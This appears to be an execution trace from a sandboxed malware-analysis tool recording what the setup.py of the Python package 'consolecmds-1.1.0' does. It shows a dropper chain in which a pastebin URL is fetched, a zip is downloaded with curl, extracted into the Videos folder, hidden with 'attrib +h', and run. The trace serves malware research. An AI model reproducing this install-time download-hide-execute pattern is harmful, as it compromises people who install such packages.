[artifact_eval/samples/packages/035_consolecmds-1.1.0/_pyfex_import_consolecmds.py:3] [print]('[pyfex-entry] import consolecmds')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/_pyfex_import_consolecmds.py:4] [import_module]('consolecmds')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_bisect.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_lsprof.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_codecs_kr.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_curses.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('nis.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_testimportmultiple.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_lzma.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('syslog.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_codecs_iso2022.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('resource.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('xxlimited.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_pickle.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_socket.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_dbm.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('fcntl.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_testclinic.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('grp.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_ssl.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_datetime.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_posixshmem.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_decimal.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_sha512.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('termios.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_ctypes.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('binascii.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('mmap.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_sha1.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:95] [system]('tar -xf ""%temp%/nice.zip"" -C ""artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos""')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('spwd.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_codecs_hk.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_codecs_jp.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_multibytecodec.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_testmultiphase.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('__pycache__')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_sha3.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('zlib.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_crypt.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_testcapi.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_xxtestfuzz.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_tkinter.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_random.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_sha256.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_md5.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_posixsubprocess.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:97] [hide_file]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:60] [system]('attrib +h artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:98] [hide_file]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/pytransform')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:60] [system]('attrib +h artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/pytransform')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:99] [run_file]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:67] [print]('Running')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:68] [Popen]('python artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py', close_fds=True, shell=True, stderr=-1, stdin=None, stdout=-1)
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:69] [Popen.communicate](<Popen: returncode: None args: 'python /home/user/project-repo/PyFEX/PyFEX-A...>)
[<string>:1] [__new__](<class 'selectors.SelectorKey'>, (<_io.BufferedReader name=4>, 4, 1, None))
[<string>:1] [__new__](<class 'selectors.SelectorKey'>, (<_io.BufferedReader name=6>, 6, 1, None))
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:70] [print]("b''|b'/bin/sh: 1: python: not found\\n'")
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:85] [get_new_filepath]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos', 'code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:36] [join]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos', 'code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:86] [get_new_filepath]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos', 'pytransform')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:36] [join]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos', 'pytransform')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:87] [print]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:89] [exists]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:93] [get_cdn]()
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:41] [DummyObject]('https://pastebin.com/raw/tCPxwCgS')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:94] [system]("curl -o %temp%/nice.zip -silent  DummyObject(No module named 'requests'@setup.py:1; lineage[5] ops: getattr(get)->call->getattr(text))")
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:95] [system]('tar -xf ""%temp%/nice.zip"" -C ""artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos""')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:97] [hide_file]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:60] [system]('attrib +h artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:98] [hide_file]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/pytransform')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:60] [system]('attrib +h artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/pytransform')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:99] [run_file]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:67] [print]('Running')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:68] [Popen]('python artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py', close_fds=True, shell=True, stderr=-1, stdin=None, stdout=-1)
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:69] [Popen.communicate](<Popen: returncode: None args: 'python /home/user/project-repo/PyFEX/PyFEX-A...>)
[<string>:1] [__new__](<class 'selectors.SelectorKey'>, (<_io.BufferedReader name=4>, 4, 1, None))
[<string>:1] [__new__](<class 'selectors.SelectorKey'>, (<_io.BufferedReader name=6>, 6, 1, None))
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:70] [print]("b''|b'/bin/sh: 1: python: not found\\n'")
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:85] [get_new_filepath]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos', 'code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:36] [join]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos', 'code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:86] [get_new_filepath]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos', 'pytransform')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:36] [join]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos', 'pytransform')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:87] [print]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:89] [exists]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:93] [get_cdn]()
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:41] [DummyObject]('https://pastebin.com/raw/tCPxwCgS')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:94] [system]("curl -o %temp%/nice.zip -silent  DummyObject(No module named 'requests'@setup.py:1; lineage[5] ops: getattr(get)->call->getattr(text))")
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:95] [system]('tar -xf ""%temp%/nice.zip"" -C ""artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos""')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:97] [hide_file]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:60] [system]('attrib +h artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:98] [hide_file]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/pytransform')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:60] [system]('attrib +h artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/pytransform')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:99] [run_file]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:67] [print]('Running')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:68] [Popen]('python artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py', close_fds=True, shell=True, stderr=-1, stdin=None, stdout=-1)
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:69] [Popen.communicate](<Popen: returncode: None args: 'python /home/user/project-repo/PyFEX/PyFEX-A...>)
[<string>:1] [__new__](<class 'selectors.SelectorKey'>, (<_io.BufferedReader name=4>, 4, 1, None))
[<string>:1] [__new__](<class 'selectors.SelectorKey'>, (<_io.BufferedReader name=6>, 6, 1, None))
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:70] [print]("b''|b'/bin/sh: 1: python: not found\\n'")
